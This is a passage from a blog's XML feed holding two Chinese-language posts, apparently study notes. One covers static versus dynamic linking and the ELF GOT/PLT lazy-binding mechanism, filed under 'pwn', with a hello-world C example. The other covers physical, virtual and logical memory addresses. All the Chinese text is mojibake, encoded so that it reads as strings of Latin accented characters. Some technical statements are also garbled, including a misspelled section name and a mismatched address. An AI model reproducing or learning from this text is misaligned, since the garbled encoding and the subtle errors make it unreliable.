è£…è½½é€Ÿåº¦å¿«ï¼Œæ‰§è¡Œé€Ÿåº¦ç•¥æ¯”åŠ¨æ€é“¾æ¥åº“å¿«ï¼›</li><li>åªéœ€ä¿è¯åœ¨å¼€å‘è€…çš„è®¡ç®—æœºä¸­æœ‰æ­£ç¡®çš„.libæ–‡ä»¶ï¼Œåœ¨ä»¥äºŒè¿›åˆ¶å½¢å¼å‘å¸ƒç¨‹åºæ—¶ä¸éœ€è€ƒè™‘åœ¨ç”¨æˆ·çš„è®¡ç®—æœºä¸Š.libæ–‡ä»¶æ˜¯å¦å­˜åœ¨åŠç‰ˆæœ¬é—®é¢˜ã€‚</li></ul><h5 id="ç¼ºç‚¹"><a href="#ç¼ºç‚¹" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul><li>ä½¿ç”¨é™æ€é“¾æ¥ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶ä½“ç§¯è¾ƒå¤§ï¼ŒåŒ…å«ä¸€äº›é‡å¤ç›¸åŒçš„ä»£ç ï¼Œé€ æˆå†…å­˜ç©ºé—´çš„æµªè´¹ã€‚</li></ul><h4 id="åŠ¨æ€é“¾æ¥"><a href="#åŠ¨æ€é“¾æ¥" class="headerlink" title="åŠ¨æ€é“¾æ¥"></a>åŠ¨æ€é“¾æ¥</h4><p>åŠ¨æ€é“¾æ¥ï¼ˆDynamic Linkingï¼‰ï¼ŒæŠŠé“¾æ¥è¿™ä¸ªè¿‡ç¨‹æ¨è¿Ÿåˆ°äº†è¿è¡Œæ—¶å†è¿›è¡Œï¼Œåœ¨å¯æ‰§è¡Œæ–‡ä»¶è£…è½½æ—¶æˆ–è¿è¡Œæ—¶ï¼Œç”±æ“ä½œç³»ç»Ÿçš„è£…è½½ç¨‹åºåŠ è½½åº“ã€‚è¿™é‡Œçš„åº“æŒ‡çš„æ˜¯åŠ¨æ€é“¾æ¥åº“ï¼ŒWindowsä¸‹ä»¥<code>.dll</code>ä¸ºåç¼€ï¼ŒLinuxä¸‹ä»¥<code>.so</code>ä¸ºåç¼€ã€‚</p><p>åœ¨Windowsä¸‹çš„åŠ¨æ€é“¾æ¥ä¹Ÿå¯ä»¥ç”¨åˆ°.libä¸ºåç¼€çš„æ–‡ä»¶ï¼Œä½†è¿™é‡Œçš„<code>.lib</code>æ–‡ä»¶å«åšå¯¼å…¥åº“ï¼Œæ˜¯ç”±<code>.dll</code>æ–‡ä»¶ç”Ÿæˆçš„ã€‚</p><h5 id="ä¼˜ç‚¹-1"><a href="#ä¼˜ç‚¹-1" class="headerlink" title="ä¼˜ç‚¹"></a>ä¼˜ç‚¹</h5><ul><li><p>ç”Ÿæˆçš„å¯æ‰§è¡Œæ–‡ä»¶è¾ƒå°ï¼›</p></li><li><p>é€‚ç”¨äºå¤§è§„æ¨¡çš„è½¯ä»¶å¼€å‘ï¼Œä½¿å¼€å‘è¿‡ç¨‹ç›¸å¯¹ç‹¬ç«‹ï¼Œè€¦åˆåº¦å‡å°ï¼Œä¾¿äºä¸åŒçš„å¼€å‘è€…å’Œå¼€å‘ç»„ç»‡ä¹‹é—´è¿›è¡Œå¼€å‘å’Œæµ‹è¯•ï¼›</p></li><li><p>ä¸åŒç¼–ç¨‹è¯­è¨€ç¼–å†™çš„ç¨‹åºåªè¦æŒ‰ç…§å‡½æ•°è°ƒç”¨çº¦å®šå°±å¯ä»¥è°ƒç”¨åŒä¸€ä¸ªDLLå‡½æ•°ï¼›</p></li><li><p>DLLæ–‡ä»¶ä¸EXEæ–‡ä»¶ç‹¬ç«‹ï¼Œåªè¦è¾“å‡ºæ¥å£ä¸å˜ï¼ˆå³åç§°ã€å‚æ•°ã€è¿”å›å€¼ç±»å‹å’Œè°ƒç”¨çº¦å®šä¸å˜ï¼‰ï¼Œæ›´æ¢DLLæ–‡ä»¶ä¸ä¼šå¯¹EXEæ–‡ä»¶é€ æˆä»»ä½•å½±å“ï¼Œå› è€Œæå¤§åœ°æé«˜äº†å¯ç»´æŠ¤æ€§å’Œå¯æ‰©å±•æ€§</p></li></ul><h5 id="ç¼ºç‚¹-1"><a href="#ç¼ºç‚¹-1" class="headerlink" title="ç¼ºç‚¹"></a>ç¼ºç‚¹</h5><ul><li>ä½¿ç”¨åŠ¨æ€é“¾æ¥åº“çš„åº”ç”¨ç¨‹åºä¸æ˜¯è‡ªå®Œå¤‡çš„ï¼Œå®ƒä¾èµ–çš„DLLæ¨¡å—ä¹Ÿè¦å­˜åœ¨ï¼Œå¦‚æœä½¿ç”¨è½½å…¥æ—¶åŠ¨æ€é“¾æ¥ï¼Œç¨‹åºå¯åŠ¨æ—¶å‘ç°DLLä¸å­˜åœ¨ï¼Œç³»ç»Ÿå°†ç»ˆæ­¢ç¨‹åºå¹¶ç»™å‡ºé”™è¯¯ä¿¡æ¯ï¼›</li><li>é€Ÿåº¦æ¯”é™æ€é“¾æ¥æ…¢</li></ul><h1 id="GOTä¸PLT"><a href="#GOTä¸PLT" class="headerlink" title="GOTä¸PLT"></a>GOTä¸PLT</h1><p>ä¸ºäº†æ”¯æŒåŠ¨æ€é“¾æ¥è¿™ä¸€å·¥ä½œè¿‡ç¨‹ï¼Œåœ¨<code>.elf</code>æ–‡ä»¶ä¸­æœ‰å››ä¸ªsectionä¸ä¹‹ç›¸å…³ï¼š</p><ul><li><code>.got</code> ï¼šå…¨å±€åç§»è¡¨ï¼ˆGlobal Offset Tableï¼‰ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨ç¬¦å·çš„ç»å¯¹åœ°å€å³è¿è¡Œæ—¶ç¬¦å·çš„çœŸå®åœ°å€ï¼Œç”±é“¾æ¥å™¨è¿›è¡Œå¡«å……ï¼ŒåŒ…å«åŠ¨æ€é“¾æ¥çš„å‡½æ•°çš„åœ°å€ã€‚</li><li><code>.plt</code>ï¼šè¿‡ç¨‹é“¾æ¥è¡¨ï¼ˆProcedure Linkage Tableï¼‰ï¼Œå°±æ˜¯ä¸€å°æ®µè·³è½¬æŒ‡ä»¤ï¼Œå­˜æœ‰ä»<code>.got.plt</code>ä¸­æŸ¥æ‰¾å¤–éƒ¨å‡½æ•°åœ°å€çš„ä»£ç ï¼Œè‹¥æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°ï¼Œåˆ™ä¼šè§¦å‘é“¾æ¥å™¨è§£æå‡½æ•°åœ°å€å¹¶å¡«å……åœ¨<code>.got.plt</code>ç›¸åº”çš„ä½ç½®ï¼›è‹¥å‡½æ•°åœ°å€å·²ç»å­˜å‚¨åœ¨<code>.got.plt</code>ä¸­åˆ™ç›´æ¥è·³è½¬åˆ°å¯¹åº”åœ°å€ç»§ç»­æ‰§è¡Œã€‚</li><li><code>.got.plt</code>ï¼šæ˜¯pltçš„gotã€‚å®ƒåŒ…å«è¿”å›.pltå»è§¦å‘æŸ¥æ‰¾çš„åœ°å€ï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªç»è¿‡æŸ¥æ‰¾åå¡«å……çš„æ­£ç¡®ç¬¦å·åœ°å€ã€‚</li><li><code>.plt.got</code>ï¼šä¸çŸ¥é“å¹²å•¥ç”¨çš„â€¦â€¦</li></ul><h3 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h3><p>å› ä¸ºé™æ€é“¾æ¥ä¸­çš„é‡å®šä½å·¥ä½œå…¨éƒ¨åœ¨è¿è¡Œæ—¶å®Œæˆï¼Œä¸”å½“æˆ‘ä»¬å¼•ç”¨äº†æŸä¸€ä¸ªåº“ï¼Œç¨‹åºå°†ä¼šå¯¹å…¶ä¸­çš„æ‰€æœ‰å‡½æ•°å’Œå…¨å±€å˜é‡è¿›è¡Œé‡å®šä½ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œé“¾æ¥çš„åŠ¨æ€åº“è¶Šå¤§é“¾æ¥çš„æ—¶é—´å°±è¶Šé•¿ï¼Œç³»ç»Ÿçš„å¯åŠ¨æ—¶é—´å°±è¶Šé•¿ã€‚</p><p>ä¸ºäº†è§£å†³è¿™ä¸€é—®é¢˜ï¼Œå»¶è¿Ÿç»‘å®šçš„æ¦‚å¿µè¢«æå‡ºã€‚å»¶è¿Ÿç»‘å®šè§„å®šåªæœ‰ç¬¦å·çœŸæ­£è¢«å¼•ç”¨æ—¶æ‰ä¼šè¿›è¡Œé‡å®šä½ï¼Œè€Œä¸æ˜¯åœ¨åˆšå¼€å§‹å°±å¯¹æ‰€æœ‰çš„åŠ¨æ€ç¬¦å·è¿›è¡Œé‡å®šä½ã€‚</p><p>å»¶è¿Ÿç»‘å®šç”±pltæ¥å®ç°ï¼Œåœ¨elfæ–‡ä»¶ä¸­ï¼Œpltè¡¨å’Œgotè¡¨å‡ ä¹æ—¶æ—¶åˆ»åˆ»ä¼´éšç€<del>ï¼ˆè¿™æ˜¯å¯ä»¥å—‘çš„å—æ˜¯å¯ä»¥çš„å—ï¼‰</del>ã€‚</p><p>åœ¨gotè¡¨ä¸­ï¼Œå‰ä¸‰é¡¹å†…å®¹ä¸å¯¹åº”ç¬¦å·çš„å¼•ç”¨ï¼Œåˆ†åˆ«å¯¹åº”ï¼š</p><ul><li>got[0]ï¼šå½“å‰çš„elfæ–‡ä»¶ä¸­.synamicæ®µçš„åœ°å€</li><li>got[1]ï¼šä¿ç•™</li><li>got[2]ï¼šåŠ¨æ€é“¾æ¥å™¨çš„ç¬¦å·è§£æå‡½æ•°</li></ul><p>å…¶ä½™çš„é¡¹è¢«ç”¨ä½œç¬¦å·é‡å®šä½ï¼Œå¯¹äºå¤–éƒ¨å‡½æ•°(å³å¤–éƒ¨è·³è½¬)çš„ got è¡¨é¡¹è€Œè¨€ï¼Œåœ¨ç¼–è¯‘é˜¶æ®µä¿å­˜çš„æ˜¯ .plt è¡¨çš„èµ·å§‹ä½ç½®ï¼Œå¯¹äºæ•°æ®å¼•ç”¨çš„ plt è¡¨é¡¹è€Œè¨€ï¼Œç¼–è¯‘é˜¶æ®µçš„å€¼ä¸º 0ã€‚</p><p>plt çš„ä½œç”¨æ˜¯ä¸ºæ¯ä¸€æ¬¡æ¨¡å—å¤–éƒ¨çš„å‡½æ•°è°ƒç”¨è®¾ç½®ä¸€å°æ®µè·³è½¬ä»£ç ã€‚åœ¨ arm ç¼–è¯‘å™¨çš„å®ç°ä¸­ï¼Œå¯¹äºæ¯ä¸€é¡¹å¤–éƒ¨è·³è½¬ï¼Œå¯¹åº” plt ä¸­ä¸‰æ¡æŒ‡ä»¤ã€‚å’Œ got ç±»ä¼¼ï¼Œplt çš„å‰é¢éƒ¨åˆ†ä¹Ÿè¢«ç³»ç»Ÿâ€å¾ç”¨â€äº†ï¼Œè¿™éƒ¨åˆ†è´Ÿè´£è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ä¸­çš„ç¬¦å·è§£æå‡½æ•°å®ŒæˆåŠ¨æ€è§£æå·¥ä½œï¼Œåç»­çš„éƒ¨åˆ†æ‰æ˜¯å¯¹åº”å…·ä½“å¤–éƒ¨è·³è½¬çš„æŒ‡ä»¤ã€‚</p><p>åœ¨ç¨‹åºçš„ç¼–è¯‘é˜¶æ®µï¼Œplt è·³è½¬æŒ‡ä»¤è¡¨é¡¹å’Œ got è¡¨é¡¹å°±å®ç°äº†ç»‘å®šï¼Œå…¶æ˜ å°„å…³ç³»ä¸ºï¼šplt ç¬¬ä¸€æ®µè·³è½¬æŒ‡ä»¤å¯¹åº” got ç¬¬å››ä¸ªè¡¨é¡¹ï¼Œplt ç¬¬äºŒæ®µè·³è½¬æŒ‡ä»¤å¯¹åº” got ç¬¬äº”ä¸ªè¡¨é¡¹ï¼Œä»¥æ­¤ç±»æ¨ã€‚</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-33-10.png"></p><p>ğŸŒ°ï¼š<br>å¯¹äºä¸€ä¸ªcè¯­è¨€æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span> &#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world1!&quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Hello world2!&quot;</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯¹å…¶è¿›è¡Œç¼–è¯‘åæŸ¥çœ‹å…¶mainå‡½æ•°çš„åæ±‡ç¼–ç»“æœ</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_16-58-54.png"></p><blockquote><p>%ripæ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œæ­¤å¤„ç›¸å½“äºå¯„å­˜å™¨ç›¸å¯¹å¯»å€</p></blockquote><p>åœ¨<code>0x40054d</code>è°ƒç”¨äº†<code>0x400430&lt;puts@plt&gt;</code>ï¼Œå½“ç¨‹åºripåˆ°400340æ—¶ï¼Œéœ€è¦æ‰§è¡Œçš„æ“ä½œå¯¹åº”çš„æ±‡ç¼–ä»£ç ä¸ºï¼š</p><p><img src="/img/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5GOT%E4%B8%8EPLT/Snipaste_2023-04-13_17-00-02.png"></p><hr><p>é™†é™†ç»­ç»­æŠŠåŸºç¡€çš„å°é›¶ç¢å­¦å®Œå•¦ï¼ğŸ¥³</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€</title>
    <link href="/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/"/>
    <url>/2023/04/03/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/</url>
    
    <content type="html"><![CDATA[<p>å…³äºç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€çš„å®šä¹‰å’Œä¹‹é—´çš„å…³ç³»</p><span id="more"></span><p>è™½ç„¶å†™äº†è¿™ä¹ˆå¤šçŸ¥è¯†ç‚¹ä½†è„‘è¢‹è¿˜æ˜¯ä¹±ä¹±çš„ï¼Œå¸Œæœ›å“ªå¤©çªç„¶å¼€çªå­ğŸ¥±</p><h3 id="ç†è§£å†…å­˜"><a href="#ç†è§£å†…å­˜" class="headerlink" title="ç†è§£å†…å­˜"></a>ç†è§£å†…å­˜</h3><p>æˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çš„å„ç§æ•°æ®éƒ½æ˜¯å­˜å‚¨åœ¨ç¡¬ç›˜ç­‰å­˜å‚¨å™¨ä¸Šï¼Œä½†ç¡¬ç›˜çš„è¿è¡Œé€Ÿåº¦å¾ˆæ…¢ã€‚æ‰€ä»¥éœ€è¦è¿è¡Œç¨‹åºæˆ–è€…ä½¿ç”¨æ•°æ®æ—¶ï¼Œè¿™äº›æ•°æ®å¿…é¡»ä»ç¡¬ç›˜ä¸Šè½¬åˆ°å¦ä¸€ç§å®¹é‡å°ä½†é€Ÿåº¦å¿«å¾ˆå¤šçš„å­˜å‚¨å™¨ï¼Œä¹‹åæ‰é€è¿›CPUè¿›è¡Œå¤„ç†ã€‚è¿™ä¸­é—´çš„å­˜å‚¨å™¨å°±æ˜¯å†…å­˜ã€‚</p><p>æ— è®ºä½•ç§å­˜å‚¨å™¨ï¼Œè½¯ç›˜ã€ç¡¬ç›˜ã€å…‰ç›˜æˆ–è€…å†…å­˜ï¼Œéƒ½æœ‰åœ°å€ã€‚</p><p>å…¶ä¸­ï¼š</p><ul><li>æˆ‘ä»¬ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜åœ°å€å«åš<strong>è™šæ‹Ÿå†…å­˜åœ°å€</strong>ï¼ˆ<em>Virtual Memory Address</em>ï¼‰</li><li>å®é™…å­˜åœ¨ç¡¬ä»¶é‡Œé¢çš„ç©ºé—´åœ°å€å«<strong>ç‰©ç†å†…å­˜åœ°å€</strong>ï¼ˆ<em>Physical Memory Address</em>ï¼‰ã€‚</li></ul><h1 id="ç‰©ç†åœ°å€"><a href="#ç‰©ç†åœ°å€" class="headerlink" title="ç‰©ç†åœ°å€"></a>ç‰©ç†åœ°å€</h1><p><strong>ç‰©ç†åœ°å€å°±æ˜¯å¸¸è¯´çš„å†…å­˜åœ°å€ï¼Œæ˜¯å†…å­˜å½“ä¸­å­˜å‚¨æ•°æ®çš„ä¸€ä¸ªæ ‡è¯†ï¼Œå¹¶ä¸æ˜¯æ•°æ®æœ¬èº«ï¼Œé€šè¿‡å†…å­˜åœ°å€å¯ä»¥æ‰¾åˆ°å†…å­˜å½“ä¸­å­˜å‚¨çš„æ•°æ®ã€‚</strong></p><p>è®¡ç®—æœºå°†å†…å­˜åˆ’åˆ†ä¸ºä¸€ä¸ªä¸ªå°çš„å†…å­˜å•å…ƒï¼ŒåŒæ—¶å¯¹å…¶ç¼–å·ï¼Œè¿™æ ·å°±èƒ½æœ‰æ•ˆç®¡ç†å†…å­˜ã€‚åœ¨ç©ºé—´åˆ’åˆ†å®è·µä¸­ï¼Œä¸€ä¸ª<strong>å†…å­˜å•å…ƒ</strong>çš„å¤§å°ä¸º1<strong>å­—èŠ‚</strong>ã€‚ä¸€ä¸ªå­—èŠ‚æ˜¯å…«ä¸ªæ¯”ç‰¹ï¼Œç›¸å½“äºå…«ä¸ªäºŒè¿›åˆ¶ä½ï¼Œä¸¤ä¸ªåå…­è¿›åˆ¶ä½ã€‚</p><blockquote><p>å¯ä»¥ç†è§£ä¸ºä¸€æ ‹å«å†…å­˜çš„æ¥¼ï¼Œæ¯ä¸€å¥—å•†å“æˆ¿éƒ½æœ‰è‡ªå·±çš„é—¨ç‰Œå·å«å†…å­˜å•å…ƒï¼Œæ¯ä¸€ä¸ªå®¶åº­æ˜¯ä¸€ä¸ªæ•°æ®ï¼Œæ¯ä¸€ä½å®¶åº­æˆå‘˜æ‰€å±…ä½çš„å°æˆ¿é—´åˆ™ä¸ä¼šè¿›è¡Œç¼–å·ã€‚</p></blockquote><p>æ¯ä¸ªå†…å­˜å•å…ƒéƒ½æœ‰ç¼–å·ï¼ˆå†…å­˜ç¼–å·ï¼‰ï¼Œå†…å­˜ç¼–å·å¯ä»¥ç§°ä¸º<strong>åœ°å€</strong>ï¼Œåœ¨<code>C</code>è¯­è¨€ä¸­ä¹Ÿç§°ä¸º<strong>æŒ‡é’ˆ</strong>ã€‚</p><h5 id="ğŸŒ°"><a href="#ğŸŒ°" class="headerlink" title="ğŸŒ°"></a>ğŸŒ°</h5><p>åœ¨å†…å­˜ä¸­å­˜å‚¨â€ä¿®é¥°ç¬¦â€œæˆ–â€MODâ€œï¼Œå¯ä»¥ç¤ºæ„ä¸ºï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/Snipaste_2023-03-28_20-14-36.png"></p><p>![]&#x2F;img&#x2F;ç‰©ç†åœ°å€ï¼Œè™šæ‹Ÿåœ°å€å’Œé€»è¾‘åœ°å€&#x2F;Snipaste_2023-03-28_20-23-49.png)</p><blockquote><p>æ•°å­—åé¢åŠ Hè¡¨ç¤ºåå…­è¿›åˆ¶</p></blockquote><p>åœ¨ç¬¬ä¸€è¡Œä¸­ï¼Œæ¯ä¸€æ ¼è¡¨ç¤ºä¸€æ®µå†…å­˜ï¼Œè€Œæ ¼å­é‡Œçš„å†…å®¹æ˜¯è¿™æ®µå†…å®¹è®°ä¸‹çš„æ•°æ®ï¼›ç¬¬äºŒè¡Œä¸­æ¯ä¸€æ ¼å†…æ•°å­—å°±æ˜¯å¯¹åº”çš„å†…å­˜çš„åœ°å€ã€‚</p><p>æ±‰å­—åœ¨ä¸€ä¸ªåœ°å€ç©ºé—´é‡Œå‚¨å­˜ä¸ä¸‹ï¼Œä¼šæ”¾è¿›ä¸¤ä¸ªè¿ç»­çš„åœ°å€ç©ºé—´é‡Œã€‚è€Œå­—æ¯æˆ–è€…é˜¿æ‹‰ä¼¯æ•°å­—å°±å¯ä»¥æ”¾è¿›ä¸€ä¸ªå†…å­˜åœ°å€é‡Œã€‚åœ¨ä¸Šå›¾ä¸­ï¼Œâ€ä¿®â€œçš„å†…å­˜åœ°å€ä¸º1000Hï¼Œæˆ–è€…Mçš„å†…å­˜åœ°å€ä¸ºâ€1000Hâ€ã€‚</p><h1 id="è™šæ‹Ÿåœ°å€"><a href="#è™šæ‹Ÿåœ°å€" class="headerlink" title="è™šæ‹Ÿåœ°å€"></a>è™šæ‹Ÿåœ°å€</h1><p>è™šæ‹Ÿå­˜å‚¨å™¨ä¸æ˜¯ä»»ä½•å®é™…çš„ç‰©ç†å­˜å‚¨å™¨ï¼Œè€Œæ˜¯å€ŸåŠ©ç£ç›˜ç­‰è¾…åŠ©å­˜å‚¨å™¨æ¥æ‰©å¤§ä¸»å­˜å®¹é‡ï¼Œä½¿ä¹‹ä¸ºæ›´å¤§æˆ–æ›´å¤šçš„ç¨‹åºæ‰€ä½¿ç”¨ã€‚</p><p><strong>è™šæ‹Ÿåœ°å€ç”¨äºæŒ‡ç¤ºè™šæ‹Ÿå­˜å‚¨å™¨çš„åœ°å€ï¼Œå®ƒæ˜¯ç”¨é€»è¾‘åœ°å€æŒ‡ç¤ºçš„</strong></p><p>åœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿›ç¨‹ä¸ç‰©ç†åœ°å€æ˜ å°„èµ·æ¥ï¼Œæ‰èƒ½åŒºåˆ†è¿™äº›å†…å­˜ä¸­å­˜å‚¨çš„æ•°æ®å±äºå“ªä¸ªè¿›ç¨‹ã€‚ä½†å†…å­˜å¤§å°æœ‰é™ï¼Œè¿›ç¨‹å´å¯ä»¥å¾ˆå¤šï¼Œç”šè‡³å¯èƒ½åŒæ—¶è¿›è¡Œå¤šä¸ªè¿›ç¨‹ã€‚ä¸ºäº†å®ç°è®©å¾ˆå¤šè¿›ç¨‹å…±ç”¨ä¸€ä¸ªå­˜å‚¨èµ„æºæœ‰é™çš„å†…å­˜ï¼Œæˆ‘ä»¬å¼•å‡ºè™šæ‹Ÿåœ°å€çš„æ¦‚å¿µï¼Œæˆ‘ä»¬å…ˆå°†è¿›ç¨‹ä¸è™šæ‹Ÿåœ°å€æ˜ å°„èµ·æ¥ï¼Œå†å°†è™šæ‹Ÿåœ°å€ä¸ç‰©ç†åœ°å€æ˜ å°„èµ·æ¥ã€‚</p><p>æ“ä½œç³»ç»Ÿå¼•å…¥äº†è™šæ‹Ÿå†…å­˜ï¼Œè¿›ç¨‹æŒæœ‰çš„è™šæ‹Ÿåœ°å€ä¼šé€šè¿‡ CPU èŠ¯ç‰‡ä¸­çš„å†…å­˜ç®¡ç†å•å…ƒï¼ˆMMUï¼‰çš„æ˜ å°„å…³ç³»ï¼Œæ¥è½¬æ¢å˜æˆç‰©ç†åœ°å€ï¼Œç„¶åå†é€šè¿‡ç‰©ç†åœ°å€è®¿é—®å†…å­˜ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-0204ff048148735a260fa5f94f475f14_r.png"></p><h1 id="é€»è¾‘åœ°å€"><a href="#é€»è¾‘åœ°å€" class="headerlink" title="é€»è¾‘åœ°å€"></a>é€»è¾‘åœ°å€</h1><p>é€»è¾‘åœ°å€ï¼Œå°±æ˜¯æŒ‡æœºå™¨è¯­è¨€æŒ‡ä»¤ä¸­ç”¨æ¥æŒ‡å®šä¸€ä¸ªæ“ä½œæ•°æˆ–ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ï¼Œ<strong>ç”±ä¸€ä¸ªæ®µ(segment)å’Œåç§»é‡(offset)ç»„æˆ</strong>ï¼Œè¯´åœ°ç›´ç™½ç‚¹å°±æ˜¯CPUæ‹¿åˆ°çš„åœ°å€ã€‚</p><p>æ®µå·ï¼šç”¨æ¥æŸ¥æ‰¾æ®µçš„èµ·å§‹åœ°å€ï¼Œå®ƒè¢«å­˜å‚¨åœ¨æ®µå¯„å­˜å™¨å½“ä¸­</p><p>åç§»åœ°å€ï¼šæ˜¯å­˜å‚¨å•å…ƒçš„ç‰©ç†åœ°å€ä¸æ‰€åœ¨èµ·å§‹æ®µçš„å·®å€¼</p><h1 id="å„ç§å†…å­˜çš„å…³ç³»"><a href="#å„ç§å†…å­˜çš„å…³ç³»" class="headerlink" title="å„ç§å†…å­˜çš„å…³ç³»"></a>å„ç§å†…å­˜çš„å…³ç³»</h1><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/bba9443a9c0249ffa501df86649ce5d8.png"></p><h2 id="è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€"><a href="#è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€" class="headerlink" title="è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€"></a>è™šæ‹Ÿåœ°å€å’Œç‰©ç†åœ°å€</h2><h3 id="å†…å­˜åˆ†æ®µ"><a href="#å†…å­˜åˆ†æ®µ" class="headerlink" title="å†…å­˜åˆ†æ®µ"></a>å†…å­˜åˆ†æ®µ</h3><p>ç¨‹åºæ˜¯ç”±è‹¥å¹²ä¸ªé€»è¾‘åˆ†æ®µç»„æˆçš„ï¼Œå¦‚å¯ç”±ä»£ç åˆ†æ®µã€æ•°æ®åˆ†æ®µã€æ ˆæ®µã€å †æ®µç»„æˆã€‚ä¸åŒçš„æ®µæ˜¯æœ‰ä¸åŒçš„å±æ€§çš„ï¼Œæ‰€ä»¥å°±ç”¨åˆ†æ®µï¼ˆSegmentationï¼‰çš„å½¢å¼æŠŠè¿™äº›æ®µåˆ†ç¦»å‡ºæ¥ã€‚</p><p>åˆ†æ®µæœºåˆ¶ä¸‹çš„è™šæ‹Ÿåœ°å€ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼Œ<strong>æ®µé€‰æ‹©å­</strong>å’Œ<strong>æ®µå†…åç§»é‡</strong>ã€‚</p><p><img src="/img/%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%EF%BC%8C%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E5%92%8C%E9%80%BB%E8%BE%91%E5%9C%B0%E5%9D%80/v2-4803e11dc95cf478d95674f25efd9a7f_720w.webp"></p><h4 id="æ®µé€‰æ‹©å­"><a href="#æ®µé€‰æ‹©å­" class="headerlink" title="æ®µé€‰æ‹©å­"></a>æ®µé€‰æ‹©å­</h4><p>æ®µé€‰æ‹©å­ä¿å­˜åœ¨å¯„å­˜å™¨é‡Œã€‚æ®µé€‰æ‹©å­æœ€é‡è¦çš„æ˜¯æ®µå·ï¼Œç”¨ä½œæ®µè¡¨çš„ç´¢å¼•ã€‚æ®µè¡¨é‡Œä¿å­˜çš„æ˜¯è¿™ä¸ªæ®µçš„åŸºåœ°å€ã€æ®µçš„ç•Œé™å’Œç‰¹æƒç­‰çº§ç­‰ã€‚</p><p>æ®µé€‰æ‹©å­æ˜¯åå…­ä½çš„ï¼Œå…¶ä¸­åå››ä½è¡¨ç¤ºåœ°å€ä¿¡æ¯</p><h4 id="æ®µåç§»é‡"><a href="#æ®µåç§»é‡" class="headerlink" 